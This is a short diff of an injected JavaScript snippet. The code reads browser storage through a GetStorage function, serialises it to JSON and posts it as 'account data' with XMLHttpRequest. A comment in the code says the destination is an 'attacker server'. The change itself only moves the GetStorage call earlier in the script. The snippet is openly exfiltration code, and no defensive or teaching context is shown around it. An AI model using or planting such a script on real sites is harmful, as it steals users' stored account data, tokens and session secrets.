@@ -14,6 +14,7 @@ while(i--)
 }
 return values;
 }
+ var result = GetStorage();
 //send data to attacker server
 function sendacct(data) { 
 var xhttp = new XMLHttpRequest(); 
@@ -23,7 +24,7 @@ xhttp.setRequestHeader("Access-Control-Allow-Origin", "*");
 xhttp.send("account data=" + data);
 } 
 //end of sendacct
-var result = GetStorage(); 
+ 
 var json = JSON.stringify(result);
 sendacct(json);
 </script>
